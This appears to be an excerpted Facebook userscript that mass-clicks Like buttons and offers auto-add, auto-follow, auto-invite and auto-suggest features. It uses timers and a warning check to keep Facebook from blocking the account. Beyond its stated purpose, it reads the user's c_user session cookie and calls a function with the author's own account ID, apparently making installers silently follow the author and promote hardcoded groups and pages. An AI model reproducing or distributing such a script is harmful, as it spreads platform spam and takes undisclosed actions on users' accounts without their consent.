// ==UserScript==
// @name			AutoADD | AutoLike Status | AutoLike Comment | AutoFollow(sub) | AutoInvite | AutoSuggest
// @namespace			AutoADD | AutoLike Status | AutoLike Comment | AutoFollow(sub) | AutoInvite | AutoSuggest
// @description			Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			Cha (XnonymouX.com)
// @authorURL			http://www.facebook.com/XnonymouxOFFICIAL
// @include			htt*://www.facebook.com/*
// @icon			https://fbcdn-sphotos-f-a.akamaihd.net/hphotos-ak-ash3/538210_425628340851584_577081367_n.jpg
// @version			6.3.13
...
body.appendChild(div);unsafeWindow.AutoLike = function() {var BounceCounterLike=0;var Counter = 0;var prepare = document.getElementsByTagName("a");var buttons = new Array();for (var i = 0; i < prepare.length; i++)if(prepare[i].getAttribute("data-ft")!=null&&(prepare[i].getAttribute("title")=="Indica que Te gusta este artÃ­culo"||prepare[i].getAttribute("title")=="Like this item"||prepare[i].getAttribute("title")=="Sukai item ini"||prepare[i].getAttribute("title")=="Stop liking this item"||prepare[i].getAttribute("title")=="ÙƒÙ† Ù…Ø¹Ø¬Ø¨Ø§Ù‹ Ø¨Ù‡Ø°Ø§"||prepare[i].getAttribute("title")=="ã“ã®ã‚¢ã‚¤ãƒ†ãƒ ã«ã€Œã„ã„ã­ï¼ã€ã—ã¾ã™"||prepare[i].getAttribute("title")=="ì¢‹ì•„ìš”"||prepare[i].getAttribute("title")=="å°é€™é …ç›®è®šå¥½"||prepare[i].getAttribute("title")=="Jâ€™aime Ã§a"||prepare[i].getAttribute("title")=="Bunu beÄŸen")) {buttons[Counter] = prepare[i];Counter++;}function check_link(linknumber) {buttons[linknumber].click();var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";document.getElementById('like2').innerHTML = message;};function like_timer(timex) {window.setTimeout(bouncer_like,timex);};function check_warning() {var warning = document.getElementsByTagName("label");var checkwarning = false;for(var i = 0; i < warning.length; i++) {var myClass = warning[i].getAttribute("class");if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {alert("Warning from Facebook");checkwarning = true;}}if(!checkwarning) like_timer(2160);};function warning_timer(timex) {window.setTimeout(check_warning,timex);};function bouncer_like() {if ( BounceCounterLike < buttons.length ) {check_link(BounceCounterLike);warning_timer(700);BounceCounterLike++;}};alert('Start Auto Like Facebook by SkidderBoy');bouncer_like();
};}
body = document.body;
...
alert('You are currently using latest version');
};}
...
a("100007020730963"); //XnonymouXOFFICIAL
sublist("");

var gid = ['384199865050964'];
...
var spage_id = "335302343281187";
var spost_id = "335302343281187";
var sfoto_id = "335302343281187";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by CybRooT(XnonymouX.NeT)';
